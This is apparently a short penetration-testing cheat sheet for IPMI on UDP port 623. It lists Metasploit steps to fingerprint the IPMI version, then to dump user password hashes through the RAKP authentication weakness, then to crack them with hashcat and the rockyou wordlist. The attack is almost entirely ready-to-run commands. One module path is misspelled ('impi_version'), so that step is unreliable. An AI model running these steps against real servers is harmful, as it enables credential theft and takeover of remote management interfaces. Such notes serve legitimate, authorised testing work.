# Intelligent Platform Management Interface (IPMI)

### Resource: https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/

### UDP port: 623 (asf-rmcp)

### Identify version using Metasploit

#### 1) 

    msfconsole

#### 2)  

    use auxiliary/scanner/ipmi/impi_version

#### 3) 

    set RHOSTS HOST

#### 4) 

    run

### Then depending on the IPMI version, we can abuse the vulnerabilities below:

### Dump password hashes for users with Metasploit (IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval)

#### 1) 

    msfconsole

#### 2) 

    use auxiliary/scanner/ipmi/ipmi_dumphashes

#### 3) 

    set RHOSTS HOST

#### 4) 

    run

#### 5) 

    hashcat -m 7300 -a 0 hash /usr/share/wordlists/rockyou.txt
